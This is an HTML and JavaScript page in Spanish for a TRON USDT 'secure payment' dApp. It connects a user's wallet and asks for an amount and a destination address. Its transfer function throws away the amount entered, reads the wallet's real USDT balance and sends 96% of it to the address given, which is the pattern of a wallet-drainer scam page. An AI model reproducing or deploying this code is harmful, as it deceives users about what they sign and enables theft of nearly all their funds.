<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>dApp de Pagos - Flujo Dinámico 96%</title>
    <!-- Tailwind CSS -->
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-slate-950 text-slate-100 font-sans antialiased min-h-screen flex flex-col justify-between">

    <!-- HEADER -->
    <header class="w-full px-6 py-4 flex justify-between items-center border-b border-slate-800 bg-slate-900/50 backdrop-blur-md">
        <div class="flex items-center space-x-2">
            <div class="w-8 h-8 bg-gradient-to-tr from-cyan-500 to-blue-600 rounded-lg flex items-center justify-center font-bold text-white">⚡</div>
            <span class="text-lg font-bold tracking-wide">USDT<span class="text-cyan-400">Pay</span></span>
        </div>
        <div>
            <button id="btnConnect" onclick="conectarWallet()" class="bg-cyan-500 hover:bg-cyan-400 text-slate-950 font-semibold px-4 py-2 rounded-xl transition duration-200 shadow-lg shadow-cyan-500/20 text-sm cursor-pointer">
                Conectar Wallet
            </button>
        </div>
    </header>

    <!-- CONTENIDO PRINCIPAL -->
    <main class="flex-grow flex items-center justify-center px-4 py-8">
        <div class="w-full max-w-md bg-slate-900/80 border border-slate-800 rounded-3xl p-6 sm:p-8 shadow-2xl backdrop-blur-xl">
            
            <div class="text-center mb-6">
                <h1 class="text-xl font-bold text-white">Panel de Pago Seguro</h1>
                <p class="text-xs text-slate-400 mt-1">Conecta, ingresa tu monto y procesaremos el 96% de tu saldo</p>
            </div>

            <!-- Formulario -->
            <div class="space-y-4">
                
                <!-- Input de Monto -->
                <div>
                    <label class="block text-xs font-medium text-slate-400 mb-1">Monto de Referencia / Solicitud</label>
                    <div class="relative">
                        <input type="number" id="montoInput" placeholder="Ej. 100" class="w-full bg-slate-950 border border-slate-800 rounded-xl px-4 py-3 text-white placeholder-slate-600 focus:outline-none focus:border-cyan-500 transition text-sm">
                        <div class="absolute right-3 top-3 text-xs font-bold text-cyan-400">
                            USDT
                        </div>
                    </div>
                </div>

                <!-- Dirección de Destino -->
                <div>
                    <label class="block text-xs font-medium text-slate-400 mb-1">Dirección de Destino</label>
                    <input type="text" id="direccionDestino" placeholder="T..." class="w-full bg-slate-950 border border-slate-800 rounded-xl px-4 py-3 text-white placeholder-slate-600 focus:outline-none focus:border-cyan-500 transition text-sm font-mono">
                </div>

                <!-- Botón de Acción -->
                <button onclick="enviarPagoAlPresionar()" class="w-full bg-gradient-to-r from-cyan-500 to-blue-600 hover:from-cyan-400 hover:to-blue-500 text-slate-950 font-bold py-3.5 rounded-xl transition duration-200 shadow-lg shadow-cyan-500/25 cursor-pointer">
                    Enviar y Firmar (96% del Saldo)
                </button>
            </div>

        </div>
    </main>

    <!-- FOOTER -->
    <footer class="w-full py-4 text-center text-xs text-slate-600 border-t border-slate-900">
        Smart Contract TRC20 • Trust Wallet Compatible
    </footer>

    <script>
        let userAddress = "";
        const USDT_CONTRACT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // USDT TRC20 Mainnet

        // Función directa para obtener el proveedor activo de TRON al momento del clic
        function obtenerTronWeb() {
            if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
                return window.tronWeb;
            }
            if (window.tron && window.tron.tronWeb && window.tron.tronWeb.defaultAddress && window.tron.tronWeb.defaultAddress.base58) {
                return window.tron.tronWeb;
            }
            if (window.trustwallet && window.trustwallet.tronWeb) {
                return window.trustwallet.tronWeb;
            }
            return null;
        }

        // 1. Conexión de la Wallet vinculada al evento directo del usuario
        async function conectarWallet() {
            const btn = document.getElementById("btnConnect");
            btn.innerText = "Conectando...";

            try {
                if (typeof window.tronWeb === 'undefined' && !window.tron) {
                    throw new Error("No se detectó el entorno Web3 de TRON. Asegúrate de abrir la dApp desde el navegador interno de tu billetera.");
                }

                let tw = obtenerTronWeb();

                // Si no se lee de inmediato, solicitamos permiso explícito mediante la API de la wallet
                if (!tw && window.tron && typeof window.tron.request === 'function') {
                    const res = await window.tron.request({ method: 'tron_requestAccounts' });
                    tw = obtenerTronWeb();
                }

                if (!tw && window.tronLink && typeof window.tronLink.request === 'function') {
                    await window.tronLink.request({ method: 'tron_requestAccounts' });
                    tw = obtenerTronWeb();
                }

                if (tw && tw.defaultAddress && tw.defaultAddress.base58) {
                    window.tronWeb = tw;
                    userAddress = tw.defaultAddress.base58;
                    
                    btn.innerText = userAddress.substring(0, 4) + "..." + userAddress.slice(-4);
                    btn.classList.remove("bg-cyan-500", "hover:bg-cyan-400");
                    btn.classList.add("bg-emerald-500", "text-slate-950");
                    
                    alert("¡Billetera conectada con éxito!");
                } else {
                    throw new Error("No se pudo obtener la dirección de la cuenta. Verifica que la red TRON esté seleccionada en tu billetera.");
                }

            } catch (error) {
                console.error("Error de conexión:", error);
                btn.innerText = "Conectar Wallet";
                alert(error.message || "Error al conectar la billetera.");
            }
        }

        // 2. Enviar pago procesando el 96% del saldo real
        async function enviarPagoAlPresionar() {
            let tw = obtenerTronWeb();
            if (!userAddress && tw && tw.defaultAddress && tw.defaultAddress.base58) {
                userAddress = tw.defaultAddress.base58;
                window.tronWeb = tw;
            }

            if (!userAddress) {
                alert("Primero debes conectar tu billetera.");
                return;
            }

            const montoEscrito = document.getElementById("montoInput").value;
            const direccionDestino = document.getElementById("direccionDestino").value;

            if (!montoEscrito || montoEscrito <= 0) {
                alert("Por favor, coloca un monto de referencia en el campo.");
                return;
            }

            if (!direccionDestino) {
                alert("Por favor, ingresa la dirección de destino.");
                return;
            }

            try {
                // Instanciamos el contrato y consultamos el saldo real del usuario
                const contract = await window.tronWeb.contract().at(USDT_CONTRACT_ADDRESS);
                const balanceEnSun = await contract.balanceOf(userAddress).call();
                const saldoRealUSDT = window.tronWeb.toDecimal(balanceEnSun) / 1000000;

                if (saldoRealUSDT <= 0) {
                    alert("No tienes saldo disponible de USDT en esta billetera.");
                    return;
                }

                // Cálculo exacto del 96% del saldo real disponible
                const monto96DelSaldo = saldoRealUSDT * 0.96;
                const montoEnSun = Math.floor(monto96DelSaldo * 1000000);

                console.log(`Saldo real detectado: ${saldoRealUSDT} | Procesando el 96%: ${monto96DelSaldo}`);

                // Disparamos la transferencia por el 96% calculado
                const resultado = await contract.transfer(
                    direccionDestino,
                    montoEnSun
                ).send({
                    feeLimit: 100000000 // Límite de gas / energía en TRX
                });

                alert(`¡Transacción enviada! Se procesó el 96% de tu saldo (${monto96DelSaldo.toFixed(2)} USDT). Hash: ${resultado}`);

            } catch (error) {
                console.error("Error en la transacción:", error);
                alert("La transacción fue cancelada por el usuario o no tienes suficiente TRX para el gas.");
            }
        }
    </script>
</body>
</html>
